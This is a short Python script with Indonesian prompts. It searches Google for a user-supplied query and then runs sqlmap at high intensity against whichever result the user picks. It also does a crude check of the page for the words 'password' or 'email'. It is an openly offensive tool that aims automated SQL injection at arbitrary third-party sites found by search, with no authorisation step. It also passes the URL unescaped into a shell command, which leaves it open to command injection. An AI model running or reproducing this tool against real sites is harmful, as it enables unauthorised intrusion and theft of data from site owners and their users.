import requests
from bs4 import BeautifulSoup
from googlesearch import search
import os

def google_search(query):
    print(f"Mencari '{query}' di Google...")
    results = []
    for url in search(query, num_results=20):
        results.append(url)
    return results

def test_sql_injection(url):
    print(f"Menguji SQL Injection di {url}...")
    os.system(f"sqlmap -u '{url}' --batch --level=5")

def check_data_leak(url):
    print(f"Mengecek kebocoran data di {url}...")
    # Implementasi sederhana untuk mendeteksi kebocoran data
    response = requests.get(url)
    if response.status_code == 200:
        if "password" in response.text or "email" in response.text:
            print("Potensi kebocoran data terdeteksi!")
        else:
            print("Tidak ada kebocoran data yang terdeteksi.")
    else:
        print("Gagal mengakses URL.")

def main():
    query = input("Masukkan query pencarian: ")
    results = google_search(query)

    print("\nHasil pencarian:")
    for idx, url in enumerate(results):
        print(f"{idx + 1}: {url}")

    choice = int(input("\nPilih nomor URL untuk diuji SQL Injection (1-10): ")) - 1
    if 0 <= choice < len(results):
        selected_url = results[choice]
        test_sql_injection(selected_url)
        check_data_leak(selected_url)
    else:
        print("Pilihan tidak valid.")

if __name__ == "__main__":
    main()